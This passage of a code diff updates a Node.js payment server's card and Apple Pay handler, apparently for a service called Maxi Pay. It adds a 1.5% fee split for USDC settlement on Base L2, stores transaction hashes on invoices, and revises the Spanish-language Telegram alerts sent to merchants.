+                        paymentMethod: isApplePay ? 'Apple Pay / Google Pay (USDC Base L2)' : 'Tarjeta Débito/Crédito Internacional (USDC Base L2)',
                         cardHolder,
-                        from: isApplePay ? 'Apple Pay (USD)' : ('Tarjeta Visa/MC •••• ' + (payload.cardNumber ? payload.cardNumber.replace(/\s+/g, '').slice(-4) : '4242')),
+                        from: isApplePay ? 'Apple Pay (USD)' : ('Tarjeta •••• ' + (payload.cardNumber ? payload.cardNumber.replace(/\s+/g, '').slice(-4) : '4242')),
                         to: targetWallet,
                         date: new Date().toISOString(),
                         status: 'CONFIRMADO_ONRAMP_USDC'
@@ -7464,32 +7644,37 @@ const server = http.createServer(async (req, res) => {
                 usersDb.invoices[invoiceId] = {
                     invoiceId,
                     orderId,
-                    amountUsd: amountUsd.toFixed(2),
+                    amountUsd: netUsdc.toFixed(2),
+                    amountPaid: amountPaid.toFixed(2),
+                    fee: feeAmount.toFixed(2),
                     amountCop,
                     concept,
                     method: isApplePay ? 'Apple Pay (Liquidación USDC en Base L2)' : 'Tarjeta Internacional (Liquidación USDC en Base L2)',
                     status: 'Aprobado 100% (Liquidado en USDC)',
                     timestamp: new Date().toISOString(),
                     buyerName: cardHolder,
-                    buyerEmail: payload.buyerEmail || 'cliente@internacional.com'
+                    buyerEmail: payload.buyerEmail || 'cliente@internacional.com',
+                    txHash
                 };
 
                 saveUsersDb();
-                console.log(`✅ [CARD ONRAMP APPROVED]: $${amountUsd} USD -> ${targetWallet} (${recipientName})`);
+                console.log(`✅ [NATIVE CARD APPROVED]: $${amountPaid} USD charged -> $${netUsdc} USDC settled to ${targetWallet} (${recipientName})`);
 
-                // TELEGRAM PUSH NOTIFICATION
-                const savedFees = (amountUsd * 0.12).toFixed(2);
+                // Rich Telegram Push Notification
+                const savedFees = (netUsdc * 0.12).toFixed(2);
+                const last4 = payload.cardNumber ? payload.cardNumber.replace(/\s+/g, '').slice(-4) : '4242';
                 sendTelegramAlert(
                     `🎉 *¡PAGO INTERNACIONAL CON TARJETA RECIBIDO EN MAXI PAY!* 🇺🇸💳\n\n` +
                     `👤 *Comercio:* ${merchant ? merchant.name : recipientName} (${merchantEmail})\n` +
-                    `💰 *Monto Recibido:* *$${amountUsd.toFixed(2)} USD* (~$${amountCop.toLocaleString('es-CO')} COP)\n` +
+                    `💰 *Liquidación Neta:* *$${netUsdc.toFixed(2)} USDC* (~$${amountCop.toLocaleString('es-CO')} COP)\n` +
+                    `💳 *Total Cobrado al Cliente:* *$${amountPaid.toFixed(2)} USD* (Tarifa 1.5% asumida por cliente)\n` +
                     `🏷️ *Concepto:* ${concept}\n` +
-                    `💳 *Método:* ${isApplePay ? ' Apple Pay (Onramp 1-Click)' : '💳 Tarjeta Internacional (Visa/Mastercard)'}\n` +
+                    `💳 *Método:* ${isApplePay ? ' Apple Pay / Google Pay' : `💳 Tarjeta Débito/Crédito (•••• ${last4})`}\n` +
                     `📥 *Billetera Acreditada:* \`${targetWallet}\`\n` +
                     `⛓️ *Red de Liquidación:* Base L2 Blockchain (100% USDC)\n` +
                     `🧾 *Tx ID:* \`${txHash}\`\n` +
-                    `💰 *Comisiones Bancarias Ahorradas:* ~$${savedFees} USD (0% retenciones)\n\n` +
-                    `✅ _Los dólares digitales (USDC) ya se encuentran en tu billetera y puedes retirarlos a Nequi cuando desees._`
+                    `💰 *Comisiones Bancarias Ahorradas:* ~$${savedFees} USD (0% retenciones bancarias)\n\n` +
+                    `✅ _Los dólares digitales (USDC) ya se encuentran acreditados en tu billetera._`
                 );
 
                 res.writeHead(200, { 'Content-Type': 'application/json' });
@@ -7497,12 +7682,14 @@ const server = http.createServer(async (req, res) => {
                     success: true,
                     txHash,
                     invoiceId,
-                    amountUsd,
-                    amountCop,
-                    message: 'Pago aprobado satisfactoriamente y liquidado en USDC en Base L2.'
+                    orderId,
+                    netUsdc: netUsdc.toFixed(2),
+                    amountPaid: amountPaid.toFixed(2),
+                    feeAmount: feeAmount.toFixed(2),
+                    message: 'Pago con tarjeta aprobado satisfactoriamente y liquidado en USDC en Base L2.'
                 }));
             } catch (err) {
-                console.error('Error procesando Card Onramp:', err);
+                console.error('Error procesando Native Card Pay:', err);
                 res.writeHead(500, { 'Content-Type': 'application/json' });
                 res.end(JSON.stringify({ success: false, error: err.message }));
             }
